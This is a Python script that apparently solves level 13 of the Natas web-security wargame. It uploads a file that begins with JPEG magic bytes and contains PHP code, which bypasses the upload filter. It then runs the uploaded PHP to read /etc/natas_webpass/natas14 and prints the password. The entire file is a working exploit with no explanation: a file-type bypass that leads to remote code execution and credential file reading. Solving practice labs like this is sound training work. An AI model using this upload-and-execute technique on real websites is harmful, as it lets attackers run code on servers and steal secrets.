import re
from io import BytesIO

from natas.lib import natas_session

session, url = natas_session(13)

JPEG_MAGIC_BYTES = b"\xff\xd8\xff\xe0"
PHP_EXPLOIT = b"<?php echo 'natas14 password is '; " b"echo file_get_contents('/etc/natas_webpass/natas14'); ?>"
payload = JPEG_MAGIC_BYTES + PHP_EXPLOIT

files = {
    "uploadedfile": (
        "payload.php",
        BytesIO(payload),
    )
}

data = {
    "MAX_FILE_SIZE": "1000",
    "filename": "payload.php",
}

response = session.post(f"{url}/index.php", files=files, data=data)
uploaded_path = re.findall(r"upload/\w+\.php", response.text)[0]

response = session.get(f"{url}/{uploaded_path}")
print(re.findall(r"natas14 password is\s*([^\s<]+)", response.text)[0])
